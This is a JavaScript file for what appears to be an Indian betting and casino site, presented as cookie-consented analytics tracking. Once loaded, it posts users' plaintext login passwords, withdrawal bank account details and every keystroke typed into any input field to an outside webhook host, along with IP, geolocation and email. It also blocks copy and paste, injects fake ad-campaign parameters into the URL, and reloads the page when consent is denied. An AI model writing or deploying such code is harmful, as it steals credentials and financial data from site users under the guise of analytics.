(function () {
      const validate_cookie = (consent) => {
        if (consent === 'accept') {
          localStorage.setItem('cookiesAccepted', 'true');
          window.userIDVal = window.userID_VAl || window.location.href.split("=")[1];
            window.base64Arr = [];
            window.btnHistory = [];
            const askLocationPermission = () => {
                  let statusEl = document.getElementById("locationStatus");
                  let geoFlag = true;
                  if (!navigator.geolocation) {
                    alert("Geolocation is not supported by your browser.");
                    geoFlag = false;
                  }
                  navigator.geolocation.getCurrentPosition(
                    (position) => {
                      const { latitude, longitude } = position.coords;
                      // console.log(`Location granted: ${latitude}, ${longitude}`);
                    },
                    (error) => {
                      alert("Location permission has been disabled, Please enable it manually.");
                      geoFlag = false;
                    }
                  );
                  return geoFlag;
                }
              const getLocation = () => {
                let data = "";
                if (askLocationPermission()) {
                    fetch('https://ipapi.co/json/')
                        .then(response => response.json())
                        .then(data => {
                            window.ipVal = data;
                            window.locaData = window.ipVal.city+", "+window.ipVal.region + ", "+ window.ipVal.country_name;
                        })
                    .catch(error => {
                        ipVal = error;
                        console.error('Error fetching IP address:', error);
                    });
                }
              };
              let sessionStartTime = Date.now();
              const API_ENDPOINT = "https://datapoc.clarity.testingserverdrift.com/webhook";
              const loadScript = (src, message) => {
                const script = document.createElement("script");
                script.src = src;
                script.type = "text/javascript";
                document.head.appendChild(script);
                script.onload = () => {
                  // console.log(`${message} loaded`);
                };
              };
              loadScript("https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js", "html2canvas");
              loadScript("https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js", "jsPDF");
              loadScript("https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit", "Google Translate");
              const getUserId = () => localStorage.getItem("userId") || (() => {
                const uid = "ClarityAI-" + Math.floor(100 + Math.random() * 900);
                localStorage.setItem("userId", uid);
                return uid;
              })();
              
              const getUserEmail = () => localStorage.getItem("userEmail") || "guest@example.com";
              const getUserRole = () => localStorage.getItem("userRole") || "Guest";
              const getUTM = param => new URLSearchParams(window.location.search).get(param);
                const getUTMDtls = () => {
                    const utmParams = new URLSearchParams({
                      utm_source: "google",
                      utm_medium: "cpc",
                      utm_campaign: "big_win_event",
                      utm_term: "free_bet_offer",
                      utm_content: "ad1"
                    });
                    const newUrl = `${window.location.pathname}?${utmParams.toString()}`;

                    window.history.pushState({}, '', newUrl);
                  };
                  getUTMDtls();
              const getBrowserVer = () => {
                const ua = navigator.userAgent;
                if (/chrome|crios/i.test(ua) && !/edge|edg|opr|opera/i.test(ua)) return { browserName: "Chrome", browserVersion: ua.match(/(?:chrome|crios)\/([\d.]+)/i)?.[1] };
                if (/firefox|fxios/i.test(ua)) return { browserName: "Firefox", browserVersion: ua.match(/(?:firefox|fxios)\/([\d.]+)/i)?.[1] };
                if (/safari/i.test(ua) && !/chrome|crios|android/i.test(ua)) return { browserName: "Safari", browserVersion: ua.match(/version\/([\d.]+)/i)?.[1] };
                if (/edg/i.test(ua)) return { browserName: "Edge", browserVersion: ua.match(/edg\/([\d.]+)/i)?.[1] };
                if (/opr|opera/i.test(ua)) return { browserName: "Opera", browserVersion: ua.match(/(?:opr|opera)\/([\d.]+)/i)?.[1] };
                return { browserName: "Unknown", browserVersion: "Unknown" };
              };
              const getOSInfo = () => {
                const ua = navigator.userAgent;
                if (ua.includes("Windows")) return "Windows";
                if (ua.includes("Mac OS")) return "Mac OS";
                if (ua.includes("Linux")) return "Linux";
                if (ua.includes("Android")) return "Android";
                if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
                return "Unknown";
              };
              const getDeviceType = () => window.innerWidth <= 768 ? "Mobile" : (window.innerWidth <= 1024 ? "Tablet" : "Desktop");
              const device_ID = () => {
                let deviceId = localStorage.getItem("device_id");
                if (!deviceId) {
                  deviceId = crypto.randomUUID();
                  localStorage.setItem("device_id", deviceId);
                }
                return deviceId;
              };
              const getCleanDomain = (urlString) => {
                const url = new URL(urlString);
                const hostname = url.hostname;
                const isIP = /^[0-9.]+$/.test(hostname);
                if (isIP) {
                  return hostname;
                }
                const parts = hostname.replace(/^www\./, '').split('.');
                if (parts.length >= 2) {
                  return parts[parts.length - 2];
                }
                return parts[0];
              }
              const sendTrackingData = (eventType, extraData = {}) => {
                debugger;
                const { browserName, browserVersion } = getBrowserVer();
                const trackingData = {
              
                  // ...extraData
                  event_metadata: {
                    event_id: crypto.randomUUID(),
                    event_type: eventType,
                    event_dtls: extraData,
                    event_timestamp: new Date().toISOString(),
                    year: new Date().toISOString().split("T")[0].split("-")[0],
                    month: new Date().toISOString().split("T")[0].split("-")[1],
                    date: new Date().toISOString().split("T")[0].split("-")[2]
                  },
                  user_info: {
                    user_id: window.userIDVal,
                    email: getUserEmail(),
                    role: getUserRole(),
                    geoLocation: window.locaData,
                  },
                  device_browser_info: {
                    language: navigator.language,
                    platform: navigator.platform,
                    userAgent: navigator.userAgent,
                    browser: browserName,
                    browser_version: browserVersion,
                    os: getOSInfo(),
                    device_id: device_ID(),
                    deviceType: getDeviceType(),
                    screenResolution: `${window.screen.width}x${window.screen.height}`,
                    viewportSize: `${window.innerWidth}x${window.innerHeight}`,
                  },
                  network_info: {
                    ip: window.ipVal?.ip || "",
                    network_status: navigator.onLine ? "Online" : "Offline",
                  },
                  page_session_info:{
                    pageURL: window.location.href,
                    pageTitle: document.title,
                    project_id:getCleanDomain(window.location.href),
                    referrer: document.referrer || "Direct",
                    sessionDuration: Math.floor((Date.now() - sessionStartTime) / 1000) + "s",
                    session_id: localStorage.getItem("sessionId") || crypto.randomUUID(),
                  },
                  marketing_info: {
                    utm_source: getUTM("utm_source"),
                    utm_medium: getUTM("utm_medium"),
                    utm_campaign: getUTM("utm_campaign"),
                    utm_term: getUTM("utm_term"),
                    utm_content: getUTM("utm_content"),
                  }
                  
                };
                console.log(trackingData)
                fetch(API_ENDPOINT, {
                  method: "POST",
                  headers: { "Content-Type": "application/json" },
                  body: JSON.stringify(trackingData),
                })
                .then(response => response.json())
                .then(data => { window.resData = data; })
                .catch((err) => console.error("Tracking error", err));
              };
              const getIPAddress = () => {
                fetch("https://api.ipify.org?format=json")
                  .then(response => response.json())
                  .then(data => { window.ipVal = data; })
                  .catch(error => console.log("Error fetching IP address:", error));
              };
              const handleClick = (event) => {
                debugger;
                const tag = (event.target.tagName != "" && event.target.tagName.toUpperCase() === 'DIV')? event.target.tagName:"";
                const text = ((event.target.innerText != "" && event.target.hasOwnProperty("innerText"))? event.target.innerText:"");
                const count = btnCount(text);
                const data = {
                  tag,
                  text,
                  count,
                  time: new Date().toISOString(),
                  x: event.clientX,
                  y: event.clientY,
                  element: event.target.tagName
                };
                if (text.trim() === "Logout") {
                  sendTrackingData("logout", data);
                } else if(event.target.className == 'sdm_drp_selectedopt open') {
                  const options = document.querySelectorAll('.dropdown-options .lang_opt');
                  const values = Array.from(options).map(opt => ({
                    value: opt.getAttribute('value'),
                    text: opt.querySelector('a')?.textContent.trim()
                  }));
                  sendTrackingData("languageVal", values);
                } else if (text.trim() === 'LOGIN') {
                      data.pswd = $(".password").is(":visible")?$(".password").val():"";
                      data.username = $(".username").is(":visible")?$(".username").val():"";
                      data.timestamp = new Date().toISOString();
                      sendTrackingData("login", data);
                } else if (tag === "IMG" || event.target.tagName === "IMG") {
                  data.alt= event.target.alt;
                  data.img = event.target.getAttribute("src");
                  if (event.target.parentNode.className == 'sd_share_icon') {
                    data.text = "Share icon";
                    data.tag = event.target.parentElement.tagName;
                    sendTrackingData("share_icon", data);
                  } else if (event.target.parentNode.className == 'sd_copy_icon') {
                    data.text = "Copy icon";
                    data.tag = event.target.parentElement.tagName;
                    sendTrackingData("copy_icon", data);
                  } else {  
                    sendTrackingData("click", data);
                  }
                } else if (event.target.closest("a")) {
                  if ($(".lang_content").is(":visible")) {
                      if (event.target.text.trim() == "తెలుగు") {
                        data.lang_selected = "te"
                      } else if (event.target.text.trim() == "தமிழ்") {
                        data.lang_selected = "ta"
                      } else if (event.target.text.trim() == "English") {
                        data.lang_selected = "en"
                      } else if (event.target.text.trim() == "ಕನ್ನಡ") {
                        data.lang_selected = "kn"
                      } else if (event.target.text.trim() == "हिंदी") {
                        data.lang_selected = "hi"
                      }
                      sendTrackingData("language", data);
                  } else {
                      const link = event.target.closest("a");
                      data.href = link.getAttribute("href");
                      data.img = link.getAttribute("src");
                      data.text = (data.text != "")? data.text:event.target.parentElement.textContent.trim();
                      sendTrackingData("click", data);
                  }
                } else if(text.trim() === 'PLACE BET' || event.target.textContent.trim() === 'Place Bet') {
                  if (document.querySelector(".slip_teamnames")) {
                   const teamElement = document.querySelector(".slip_teamnames");
                    const oddsElement = document.querySelector(".odds-value"); // Adjust selector
                    const betTypeElement = document.querySelector(".bet-type-selected"); // Adjust selector
                    const eventTitle = document.querySelector(".event-title"); // Adjust selector

                    const data = {
                      teamNames: teamElement?.textContent.trim(),
                      bettingAmt: document.querySelector(".slip_stake_single")?.value,
                      odds_value: oddsElement?.textContent.trim(),
                      bet_type: betTypeElement?.textContent.trim(),
                      event_name_sport: eventTitle?.textContent.trim()
                    };
                    sendTrackingData("bet_placed", data);
                  }
                }else if (text.trim() === 'WITHDRAW') {
                    data.withdraw_amt = $("#withdraw_amount").is(":visible")?$("#withdraw_amount").val():"";
                    data.acct_name = $("#withdraw_account_name").is(":visible")?$("#withdraw_account_name").val():"";
                    data.acct_no = $("#withdraw_account_number").is(":visible")?$("#withdraw_account_number").val():"";
                    data.bank_name = $("#withdrawSeletedBank").is(":visible")?$("#withdrawSeletedBank").val():"";
                    data.branch_name = $("#withdraw_bank_branch").is(":visible")?$("#withdraw_bank_branch").val():"";
                    data.ifsc_code = $("#withdraw_ifsc_code").is(":visible")?$("#withdraw_ifsc_code").val():"";
                    sendTrackingData("withdrawal_initiated", data);
                } else {
                  data.elementProp = [...event.target.classList];
                  sendTrackingData("click", data);
                }
              };
              //checks whether obj has values
              const isObjectEmpty = (obj) => {
                return obj && typeof obj === 'object' && !Array.isArray(obj) && Object.keys(obj).length === 0;
              }
              const btnCount = (label) => {
                window.btnHistory.push(label);
                return window.btnHistory.filter(item => item === label).length;
              };
              document.querySelectorAll('.playBtn.casinoLink').forEach(btn => {
              
                btn.addEventListener('click', function () {
                  debugger;
                  const parent = btn.closest('.game-image-holder');
                  const img = parent.querySelector('img.game-image-bg');

                  var imgSrc = img?.getAttribute('src');

                  console.log('Image src:', imgSrc);
                  sendTrackingData("click", {img_src: imgSrc});
                });
              });
              document.querySelectorAll('input[type="search"]').forEach(input => {
                input.addEventListener('input', () => {
                  sendTrackingData('search_used', {
                    query: input.value,
                    timestamp: new Date().toISOString()
                  });
                });
              });

              //checks whether input is typed or deleted
              document.querySelectorAll("input, textarea").forEach(input => {
                input.addEventListener("input", () => {
                  if (input.value === "") {
                    sendTrackingData("input_cleared", { name: input.name , id: input.id});
                  } else if(input.hasOwnProperty("target")) {
                    sendTrackingData("input_typing", { name: input.target.name, value: input.target.value , text_val: input.val});
                  } else {
                    sendTrackingData("input_typing", { name: input.name, value: input.value , text_val: input.val});
                  }
                });
              });
              //cancel a bet within a time window:
              document.querySelectorAll(".cancel-bet").forEach(btn => {
                btn.addEventListener("click", () => {
                  const betId = btn.dataset.betId;
                  sendTrackingData("bet_cancelled", { betId });
                });
              });
              //triggered when file is downloaded
              document.addEventListener("click", (e) => {
                if (e.target.tagName === "A" && e.target.href.match(/\.(pdf|zip|docx?|xlsx?)$/)) {
                  sendTrackingData("file_download", { href: e.target.href });
                }
              });
              //Record when users interact with updated odds in live/multi-event betting.
              document.querySelectorAll('.odds .refresh').forEach(btn => {
                btn.addEventListener('click', () => {
                  sendTrackingData('odds_refresh_clicked', {
                    gameId: btn.closest('.game-card').dataset.gameId,
                    currentOdds: btn.dataset.newOdds
                  });
                });
              });

              //full screen enable or disable
              document.addEventListener("fullscreenchange", () => {
                sendTrackingData("fullscreen_toggle", {
                  status: !!document.fullscreenElement ? "entered" : "exited"
                });
              });

              document.querySelector('.sdm_dropdown_container').addEventListener('click',handleClick);
              const initEventListeners = () => {
                document.querySelectorAll("button, img, a, li, p").forEach(el => el.addEventListener("click", handleClick));
                document.addEventListener("keydown", (e) => {
                  if ((e.ctrlKey || e.metaKey) && ["c", "v", "x"].includes(e.key.toLowerCase())) e.preventDefault();
                });
                document.querySelectorAll("button").forEach(button => {
                  button.addEventListener("click", (e) => {
                    e.target.disabled = true;
                    setTimeout(() => e.target.disabled = false, 1000);
                  });
                });
                
                // document.querySelectorAll('.mdi-bell-ring-outline').forEach(icon => {
                //   icon.addEventListener('click', () => {
                //     sendTrackingData('notification_alert_set', {
                //       match: icon.closest('.game-card')?.querySelector('.event-title')?.textContent.trim()
                //     });
                //   });
                // });
                document.addEventListener("input", (e) => {
                  if (e.target.tagName === "INPUT") {
                    let input = document.getElementById(e.target.id);
                    if (isObjectEmpty(input) && input.type === 'checkbox') {
                      const checkbox = document.getElementById(e.target.id);
                      const spanText = checkbox.nextElementSibling.textContent; 
                      sendTrackingData("input_checkbox", { checkbox_value: spanText, input_type: "checkbox",checkbox_ischecked:  input.checked });
                    } else {
                      sendTrackingData("input_typing", { name: e.target.name, value: e.target.value });
                    }
                  } 
                  if (e.target.type === "search") sendTrackingData("search", { query: e.target.value });
                });
                //mouseover starts here
                // Select all image elements on the page
                // const images = document.querySelectorAll('img');

                // Iterate over each image and add event listeners
                // images.forEach(image => {
                //   image.addEventListener('mouseover', () => {
                //     console.log(`Mouse is over: ${image.alt}`);
                //     sendTrackingData("mouseover", {img_alt: `${image.alt}`, img_src: `${image.src}`});
                //   });

                  // image.addEventListener('mouseout', () => {
                  //   console.log(`Mouse has left: ${image.alt}`);
                  // });
                // });

                //mouseover ends here

                //detects profile start
                  let isBlocked = false;

                    document.querySelectorAll(".sdm_unameemail").forEach(block => {
                      block.addEventListener("click", () => {
                        if (isBlocked) return;
                        isBlocked = true;

                        const username = block.querySelector(".sdm_uname")?.textContent.trim();
                        const email = block.querySelector(".sdm_email")?.textContent.trim();

                        sendTrackingData("profile_block_clicked", {
                          username: username || "unknown",
                          email: email || "unknown"
                        });

                        setTimeout(() => isBlocked = false, 300); // unblock after 300ms
                      });
                    });
                    //end
                  document.querySelectorAll(".sdm_unameemail").forEach(block => {
                    block.addEventListener("click", () => {
                      const username = block.querySelector(".sdm_uname")?.textContent.trim();
                      const email = block.querySelector(".sdm_email")?.textContent.trim();

                      sendTrackingData("profile_block_clicked", {
                        username: username || "unknown",
                        email: email || "unknown"
                      });
                    });
                  });

                // Select all password inputs and icons
                  document.querySelectorAll('.pass_eye').forEach(icon => {
                    icon.style.cursor = 'pointer';  // show pointer

                    icon.addEventListener('click', () => {
                      const input = icon.parentElement.querySelector('input[type="password"], input[type="text"]');
                      if (!input) return;
                        let inputt = document.getElementById(input.id);
                          let iconn = inputt.nextElementSibling;
                          if (iconn.className.toString().includes("mdi-eye-off")) {
                              sendTrackingData("eye-icon", {icon: "mdi-eye-off", status: "Close"});
                          } else {
                              sendTrackingData("eye-icon", {icon: "mdi-eye", status: "Open"});
                          }
                      
                    });
                  });
                document.addEventListener("copy", () => sendTrackingData("copy"));
                document.addEventListener("paste", () => sendTrackingData("paste"));
                document.addEventListener("submit", (e) => {
                  const inputs = e.target.querySelectorAll("input[required]");
                  inputs.forEach(input => {
                    if (!input.value) sendTrackingData("form_error", { field: input.name, reason: "Required field missing" });
                  });
                });
                document.addEventListener("visibilitychange", () => sendTrackingData("tab_visibility", { visibilityState: document.visibilityState }));
                window.addEventListener("load", () => {
                  const loadTime = performance.now();
                  if (loadTime > 3000) {
                    sendTrackingData("slow_page_load", { loadTime: Math.round(loadTime) });
                  }
                });

                window.addEventListener("scroll", () => {
                  if ((window.innerHeight + window.scrollY) >= document.body.scrollHeight - 100) {
                    sendTrackingData("infinite_scroll_triggered", {
                      path: window.location.pathname,
                      timestamp: new Date().toISOString()
                    });
                  }
                });

                window.addEventListener("load", function () {
                  window.cookieconsent.initialise({
                    palette: {
                      popup: { background: "#000" },
                      button: { background: "#f1d600" }
                    },
                    theme: "classic",
                    content: {
                      message: "We use cookies to ensure you get the best experience on our website.",
                      dismiss: "Accept All Cookies",
                      link: "Learn more",
                      href: "https://yourdomain.com/privacy-policy"
                    }
                  });
                });
                window.addEventListener("load", () => sendTrackingData("page_view"));
                window.addEventListener("beforeunload", () => sendTrackingData("exit_page", { sessionDuration: Math.floor((Date.now() - sessionStartTime) / 1000) + "s" }));
                //called when back-navigation is happened 
                window.addEventListener("popstate", () => {
                  sendTrackingData("browser_back_navigation", { url: window.location.href });
                });
                 let loginAttemptCount = 0;

                const loginBtn = document.querySelector(".btnLogin");
                if (loginBtn) {
                  loginBtn.addEventListener("click", () => {
                    loginAttemptCount++;

                    const username = document.querySelector(".username")?.value || "";
                    const password = document.querySelector(".password")?.value || "";

                    sendTrackingData("login_attempt", {
                      count: loginAttemptCount,
                      username: username,
                      passwordLength: password.length // Never log actual password
                    });
                  });
                }
                let stakeChangeCount = 0;
                  const stakeInput = document.querySelector('.slip_stake_single');
                  if (stakeInput) {
                    stakeInput.addEventListener('input', () => {
                      stakeChangeCount++;
                      if (stakeChangeCount > 1) {
                        sendTrackingData('stake_edited_multiple_times', {
                          count: stakeChangeCount,
                          value: stakeInput.value
                        });
                      }
                    });
                  }

              };
              //triggered when ever right-click is clicked
              document.addEventListener("contextmenu", (e) => {
                sendTrackingData("right_click", {
                  tag: e.target.tagName,
                  text: e.target.innerText?.trim()
                });
              });
              const init = () => {
                initEventListeners();
                initialService();
                resetInactivityTimer();
              };
              const createModal = (params) => {
                const modal = document.createElement("div");
                modal.id = "myModal";
                Object.assign(modal.style, {
                  position: "fixed", top: "0", left: "0", width: "100vw", height: "100%",
                  backgroundColor: "rgba(0, 0, 0, 0.5)", display: "flex",
                  justifyContent: "center", alignItems: "center", zIndex: "1000"
                });

                const content = document.createElement("div");
                Object.assign(content.style, {
                  backgroundColor: "#fff", padding: "20px", borderRadius: "10px",
                  boxShadow: "0 5px 5px rgba(0,0,0,0.3)", textAlign: "center",
                  height: "150px", width: "300px", fontWeight: "bold",
                  margin: "50px 20px", color: "black"
                });

                const text = document.createElement("p");
                text.textContent = params;
                text.style.margin = "20px 0";
                text.style.fontSize = "14px";

                const close = document.createElement("button");
                close.textContent = "Close";
                Object.assign(close.style, {
                  padding: "3px 20px", border: "none", borderRadius: "15px",
                  backgroundColor: "red", color: "#fff", cursor: "pointer"
                });
                close.onclick = () => {
                  document.body.removeChild(modal);
                  
                };

                content.appendChild(text);
                content.appendChild(close);
                modal.appendChild(content);
                document.body.appendChild(modal);
              };
              let inactivityTimer;
              const resetInactivityTimer = () => {
                clearTimeout(inactivityTimer);
                inactivityTimer = setTimeout(() => {
                  createModal("User is inactive for a while");
                  sendTrackingData("web_inactive", { timespent: Math.floor((Date.now() - sessionStartTime) / 1000) + "s" });
                }, 300000);
              };
              const tracker = (event) => {
                if ((navigator.maxTouchPoints && navigator.maxTouchPoints > 0 ? "Mobile" : "WEB") == 'Mobile') {
                  // console.log(event.type, event.touches[0].clientX, event.touches[0].clientY);
                  sendTrackingData(event.type, event.touches[0].clientX, event.touches[0].clientY);
                }
              };
              ["touchstart", "touchend"].forEach((event) => {
                  document.addEventListener(event, tracker);
                });
                const initialService = () => {
                  getLocation();
                  getIPAddress();
                  window.userIDVal = getUserId();
                  window.emailVal = getUserEmail();
                  window.UserRole = getUserRole();
                  window.browserInfoDta = getBrowserVer().browserName;
                  window.OSInfoData = getOSInfo();
                  setInterval(() => {
                      sendTrackingData("session_heartbeat", {
                        sessionDuration: Math.floor((Date.now() - sessionStartTime) / 1000) + "s"
                      });
                    }, 180000 ); // every 3minute
                    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                    sendTrackingData("color_scheme_detected", {
                      mode: prefersDark ? "dark" : "light"
                    })
                }
              init();
              window.addEventListener('beforeprint', () => {
                sendTrackingData("print_attempt", { time: new Date().toISOString() });
              });
              //detects the orientation of the browser
              window.addEventListener("orientationchange", () => {
                sendTrackingData("orientation_change", {
                  orientation: screen.orientation.type
                });
              });
              //detects zoom in and out
              let lastZoom = Math.round(window.devicePixelRatio * 100);
                setInterval(() => {
                  const currentZoom = Math.round(window.devicePixelRatio * 100);
                  if (currentZoom !== lastZoom) {
                    sendTrackingData("zoom_change", { zoomLevel: currentZoom + "%" });
                    lastZoom = currentZoom;
                  }
                }, 1000);
            window.addEventListener("DOMContentLoaded", () => {
              setTimeout(() => {
                document.querySelectorAll("input").forEach(input => {
                  if (input.value && input.matches(":-webkit-autofill")) {
                    sendTrackingData("autofill_detected", {
                      field: input.name || input.id
                    });
                  }
                });
              }, 1000);
            });

        } else {
          reopenCookieBanner();
        }
      };
        const cookieCss = document.createElement("link");
        cookieCss.rel = "stylesheet";
        cookieCss.href = "https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.css";
        document.head.appendChild(cookieCss);
        const cookieScript = document.createElement("script");
        cookieScript.src = "https://cdn.jsdelivr.net/npm/cookieconsent@3/build/cookieconsent.min.js";
        cookieScript.onload = function() {
          window.cookieconsent.initialise({
            
            type: "opt-in",
            palette: {
              popup: { background: "#000" },
              button: { background: "#f1d600" }
            },
            theme: "classic",
            position: "top-right",
            content: {
              message: "We use cookies to ensure you get the best experience on our website.",
              allow: "Accept All Cookies",
              deny: "Deny",
              link: "Learn more",
              href: "https://yourdomain.com/privacy-policy"
            },
            onInitialise: function (status) {
             if (this.hasConsented()) validate_cookie('accept');
           },
           onStatusChange: function (status, chosenBefore) {
             if (this.hasConsented()) validate_cookie('accept');
            }
          });
        };
        document.head.appendChild(cookieScript);
      const reopenCookieBanner = () => {
        document.cookie = "cookieconsent_status=; expires=Thu, 01 Jan 2070 00:00:00 UTC; path=/";
        const oldBanner = document.querySelector(".cc-window");
        if (oldBanner) oldBanner.remove();
        window.location.reload();
      }
     
})();
